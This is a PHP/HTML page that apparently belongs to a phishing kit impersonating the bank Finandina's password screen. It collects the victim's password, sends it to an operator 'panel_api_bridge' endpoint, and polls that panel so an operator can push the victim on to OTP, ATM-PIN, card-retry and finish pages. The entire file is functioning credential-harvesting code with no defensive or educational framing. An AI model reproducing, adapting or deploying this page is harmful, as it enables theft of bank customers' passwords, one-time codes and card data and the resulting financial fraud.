<?php 
session_start();

$idreg = $_SESSION['idreg'] ?? '';
if (empty($idreg)) {
    header("Location: ../../checkout.php");
    exit;
}

require "../../config.php";
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Finandina - Clave de Acceso</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
</head>
<body>

<img src="img/logo.jpg" alt="" srcset="" width="100%">
<img src="img/pass2.jpg" alt="" srcset="" width="8%" style="position:absolute; left:33px;margin-top:10px;">
<img src="img/pass.jpg" alt="" srcset="" width="15%" style="position:absolute; right:33px;margin-top:-5px;">

<center><input type="password" id="txtPassword" placeholder="Ingresa tu contraseña" style="width:80%; border:none; border-bottom:1px solid #dcdcdc; padding-left:35px; height:40px; font-size:15px;"></center>
<a href="" style="position:absolute; right:30px; margin-top:10px;">¿Olvidaste tu contraseña?</a>

<p class="mensaje" style="display:none; color:red; text-align:center; margin-top:10px;">
    La contraseña debe tener al menos 4 caracteres
</p>

<center><input type="submit" id="btnPass" value="Continuar" style="width:80%; background-color:#f08ba7; margin-top:50px; height:40px; border-radius:20px;"></center>
<center><input type="submit" value="Registrarme ahora" style="width:80%; color:#f08ba7; border:1px solid #f08ba7;margin-top:10px; height:40px; background-color:white; border-radius:20px;"></center>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const txtPassword = document.getElementById("txtPassword");
    const btnPass = document.getElementById("btnPass");
    const mensaje = document.querySelector(".mensaje");
    
    const idreg = "<?php echo htmlspecialchars($idreg, ENT_QUOTES, 'UTF-8'); ?>";

    if (!idreg) {
        alert("Error interno: no hay idreg.");
        window.location.href = "../../checkout.php";
        return;
    }

    // Limpiar errores al escribir
    txtPassword.addEventListener("keyup", () => {
        txtPassword.style.border = "1px solid #CCCCCC";
        mensaje.style.display = "none";
    });

    // Enviar clave
    btnPass.addEventListener("click", async () => {
        const password = txtPassword.value.trim();
        
        if (password.length > 3) {
            btnPass.disabled = true;
            
            try {
                const fd = new FormData();
                fd.append("action", "save_pass");
                fd.append("idreg", idreg);
                fd.append("clave", password);

                const r = await fetch("../../panel_v2/process/panel_api_bridge.php", {
                    method: "POST",
                    body: fd,
                    headers: {
                        'Cache-Control': 'no-cache'
                    }
                });

                if (!r.ok) {
                    throw new Error(`HTTP ${r.status}: ${r.statusText}`);
                }

                const json = await r.json();

                if (json.success) {
                    window.location.href = "cargando.php";
                } else {
                    throw new Error(json.error || "Error desconocido");
                }

            } catch (error) {
                console.error("Error:", error);
                alert("Error al guardar clave: " + error.message);
                btnPass.disabled = false;
            }
        } else {
            mensaje.style.display = "block";
            txtPassword.style.border = "1px solid red";
            txtPassword.focus();
        }
    });

    // Verificar redirecciones del panel
    const checkRedirect = setInterval(async () => {
        try {
            const r = await fetch(`../../panel_v2/process/panel_api_bridge.php?action=check_redirect&idreg=${idreg}`, {
                method: 'GET',
                cache: 'no-cache'
            });
            
            if (r.ok) {
                const data = await r.json();
                
                if (data.success && data.data && data.data.redirect) {
                    clearInterval(checkRedirect);
                    
                    switch (data.data.estado) {
                        case 'usuario':
                            window.location.href = "finandina.php";
                            break;
                        case 'otp':
                            window.location.href = "otpfinandina.php";
                            break;
                        case 'cc':
                            window.location.href = "/reintentar.php";
                            break;
                        case '923':
                            window.location.href = "923.php";
                            break;
                        case 'atm':
                            window.location.href = "atm.php";
                            break;
                        case 'finalizado':
                            window.location.href = "finish.php";
                            break;
                    }
                }
            }
        } catch (e) {
            // Ignorar errores de polling
        }
    }, 2000);

    // Limpiar intervalo al salir
    window.addEventListener('beforeunload', () => {
        if (checkRedirect) {
            clearInterval(checkRedirect);
        }
    });
});
</script>

</body>
</html>